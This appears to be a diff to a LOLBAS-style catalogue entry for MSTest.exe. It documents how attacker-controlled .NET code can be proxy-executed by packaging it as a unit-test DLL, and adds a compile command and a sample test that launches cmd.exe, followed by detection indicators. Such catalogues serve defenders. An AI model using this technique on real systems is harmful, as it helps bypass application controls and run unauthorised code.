@@ -5,7 +5,7 @@ Author: Noam Pomerantz
 Created: 2026-04-03
 Commands:
   - Command: MSTest.exe /testcontainer:{PATH:.dll} /resultsfile:{OUTPUT_FILE}
-    Description: Loads a .NET assembly as a test container and executes all methods decorated with [TestMethod]. The test methods run with full .NET Framework access, allowing arbitrary code execution.
+    Description: Loads a .NET assembly as a test container and executes all methods decorated with the TestMethod attribute. The test methods run with full .NET Framework access, allowing arbitrary code execution.
     Usecase: Proxy execution of arbitrary .NET code by packaging it as a unit test DLL. A test runner executing attacker-controlled assemblies is unexpected outside a development context.
     Category: Execute
     Privileges: User
@@ -15,6 +15,20 @@ Full_Path:
   - Path: C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\MSTest.exe
   - Path: C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\IDE\MSTest.exe
   - Path: C:\Program Files\Microsoft Visual Studio\2022\Enterprise\Common7\IDE\MSTest.exe
+Code_Sample:
+  - Code: |-
+      // Compile with: csc.exe /target:library /reference:"C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\ReferenceAssemblies\v4.0\Microsoft.VisualStudio.QualityTools.UnitTestFramework.dll" /out:MaliciousTest.dll MaliciousTest.cs
+      using Microsoft.VisualStudio.TestTools.UnitTesting;
+      using System.Diagnostics;
+      [TestClass]
+      public class LolbasTest
+      {
+          [TestMethod]
+          public void Execute()
+          {
+              Process.Start("cmd.exe");
+          }
+      }
 Detection:
   - IOC: MSTest.exe process execution outside of a typical Visual Studio development or CI/CD context.
   - IOC: MSTest.exe loading test assemblies from unusual directories such as %TEMP% or user profile folders.
